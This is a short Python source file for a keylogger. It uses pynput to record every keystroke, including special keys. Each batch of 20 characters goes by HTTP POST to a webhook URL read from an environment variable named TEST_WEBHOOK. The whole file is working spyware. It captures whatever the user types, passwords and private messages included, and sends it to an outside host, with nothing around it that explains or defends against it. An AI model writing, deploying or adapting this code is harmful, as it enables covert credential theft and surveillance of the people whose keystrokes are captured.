from pynput import keyboard
import threading, requests, os
from dotenv import load_dotenv

load_dotenv()
webhook = os.getenv('TEST_WEBHOOK')

chars = ''
lock = threading.Lock()

def send_chars(data):
  try:
    r = requests.post(webhook, json={'content': data})
    print("Webhook sent:", data, "| Status:", r.status_code)
  except Exception as e:
    print("Failed to send webhook:", e)

def on_press(key):
  global chars
  with lock:
    try:
      chars += key.char
    except AttributeError:
      chars += f"[{key}]"

    print(len(chars), chars)

    if len(chars) >= 20:
      to_send = chars
      chars = ''
      threading.Thread(target=send_chars, args=(to_send,), daemon=True).start()

listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the main thread alive
try:
  while True:
    pass
except KeyboardInterrupt:
  print("Exiting...")